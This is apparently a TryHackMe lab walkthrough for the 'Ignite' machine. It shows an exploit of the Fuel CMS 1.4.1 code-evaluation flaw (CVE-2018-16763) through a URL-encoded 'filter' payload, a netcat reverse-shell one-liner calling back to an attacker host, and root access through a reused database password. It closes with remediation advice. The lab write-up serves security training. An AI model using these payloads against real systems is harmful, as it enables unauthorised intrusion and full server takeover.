---
title: "TryHackMe: Ignite — Weaponizing Fuel CMS 1.4.1 RCE (CVE-2018-16763) & Hardcoded Database Credentials"
author: parthpandey
categories: [TryHackMe, Walkthroughs]
tags: [linux, fuel-cms, cve-2018-16763, rce, webshell, database-credentials, root, privesc]
render_with_liquid: false
date: 2026-10-11 19:30:00 +0530
---

**Ignite** is a real-world vulnerable application machine showcasing the dangers of deploying unpatched open-source web frameworks. This walkthrough details exploiting an unauthenticated **Remote Code Execution vulnerability in Fuel CMS 1.4.1 (CVE-2018-16763)**, upgrading from an unstable web shell to an interactive reverse shell, and extracting hardcoded database configuration credentials to achieve local root privilege escalation.

---

## Room Metadata

| Attribute | Specification |
|:---|:---|
| **Platform** | TryHackMe |
| **Room URL** | [tryhackme.com/room/ignite](https://tryhackme.com/room/ignite) |
| **Target OS** | Linux (Ubuntu) |
| **Difficulty** | Easy |
| **CVE Identifier** | CVE-2018-16763 (CVSS 9.8 Critical) |
| **Primary Vectors** | Unauthenticated PHP Code Evaluation, Cleartext Database Configuration Secrets |
| **Key Utilities** | `nmap`, `curl`, `python3`, `netcat` |

---

## Attack Path Architecture

```
[Phase 1: Ingress & Reconnaissance]
   │── Nmap Scan -> Port 80 Open: Fuel CMS 1.4.1
   └── Web inspection confirms default installation credentials (admin:admin)
         │
[Phase 2: Weaponizing CVE-2018-16763]
   │── Parameter 'filter' in Fuel CMS 'pages/select' evaluates raw PHP code
   │── URL Payload: /fuel/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27whoami%27)%2b%27
   │── Confirmed execution: www-data
   └── Inject Netcat reverse shell payload to attacker listener
         │
[Phase 3: Shell Ingress & Local Discovery]
   │── Interactive session spawned as: www-data
   │── Locate user flag: /home/www-data/flag.txt
   └── Hunt for configuration files: /var/www/html/fuel/application/config/database.php
         │
[Phase 4: Privilege Escalation via Credential Reuse]
   │── database.php reveals: 'username' => 'root', 'password' => 'mememe'
   │── Test credentials against local system root account:
   │     su root (Password: mememe)
   └── Full root access achieved: /root/root.txt captured (#)
```

---

## Phase 1: Service Scanning & Vulnerability Mapping

Run an initial Nmap sweep:

```console
$ nmap -sC -sV -p- -T4 --min-rate 1000 -oN ignite_scan.txt 10.10.174.155
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
|_http-robots.txt: 1 disallowed entry 
| /fuel/
```

Navigating to `http://10.10.174.155/` displays the default installation page for **Fuel CMS Version 1.4.1**.

A search in Exploit-DB or GitHub immediately flags **CVE-2018-16763**: Fuel CMS versions prior to 1.4.3 are vulnerable to pre-authentication PHP code evaluation in the `pages/select` view controller.

---

## Phase 2: Exploiting CVE-2018-16763

The vulnerability exists because input passed into the `filter` query parameter is evaluated dynamically inside the CodeIgniter template parsing engine without sanitization.

### Proof of Concept (PoC) Verification via `curl`

We test remote command execution by issuing a URL-encoded request:

```console
$ curl -s -X GET "http://10.10.174.155/fuel/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27id%27)%2b%27"
```

The server response evaluates `system('id')`:

```html
<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">
<h4>A PHP Error was encountered</h4>
...
</div>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Command execution is confirmed.

### Weaponizing into an Interactive Reverse Shell
Start a Netcat listener on your attacking workstation:

```console
$ nc -lvnp 4444
```

Craft a URL-encoded payload to trigger a Netcat reverse shell connection back to our machine:

```console
$ curl -s -X GET "http://10.10.174.155/fuel/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.30%204444%20%3E%2Ftmp%2Ff%27)%2b%27"
```

The listener catches the reverse shell:

```console
connect to [10.10.14.30] from (UNKNOWN) [10.10.174.155] 43812
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade to an interactive PTY shell:

```console
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ignite:/$ export TERM=xterm
www-data@ignite:/$ cat /home/www-data/flag.txt
6470e3...[REDACTED USER FLAG]
```

---

## Phase 3: Hunting Configuration Files & Password Reuse

With user access established, we inspect the application web root `/var/www/html/fuel/` for configuration files that store database or administrative credentials:

```console
www-data@ignite:/var/www/html/fuel$ find . -name "*database*" 2>/dev/null
./application/config/database.php
```

Examine `database.php`:

```console
www-data@ignite:/var/www/html/fuel$ cat application/config/database.php | grep -E "hostname|username|password|database"
$db['default']['hostname'] = 'localhost';
$db['default']['username'] = 'root';
$db['default']['password'] = 'mememe';
$db['default']['database'] = 'fuel_schema';
```

The MySQL database user is configured as:
- **User**: `root`
- **Password**: `mememe`

---

## Phase 4: Local Privilege Escalation

In many legacy or poorly managed Linux environments, system administrators **reuse the same password** for the MySQL database root account and the operating system's `root` user.

We attempt to authenticate directly as the Linux `root` user using `su`:

```console
www-data@ignite:/var/www/html/fuel$ su root
Password: mememe
root@ignite:/var/www/html/fuel# id
uid=0(root) gid=0(root) groups=0(root)
root@ignite:/var/www/html/fuel# whoami
root
root@ignite:/var/www/html/fuel# cat /root/root.txt
ffdae2...[REDACTED ROOT FLAG]
```

Authentication succeeds instantly, providing full `root` control.

---

## Remediation & Hardening Actions

| Finding | Strategic Remediation |
|:---|:---|
| **Fuel CMS CVE-2018-16763** | Upgrade Fuel CMS to version $\ge 1.4.3$, where input sanitization is strictly enforced on all `filter` variables. |
| **Credential Reuse** | Enforce password uniqueness across database accounts and operating system administrative accounts. The Linux `root` account should never share passwords with application databases. |
| **Disable Password Authentication for Root** | Enforce `PermitRootLogin prohibit-password` in `/etc/ssh/sshd_config` and restrict `su` binary execution to members of the `wheel` or `sudo` group via PAM (`/etc/pam.d/su`). |
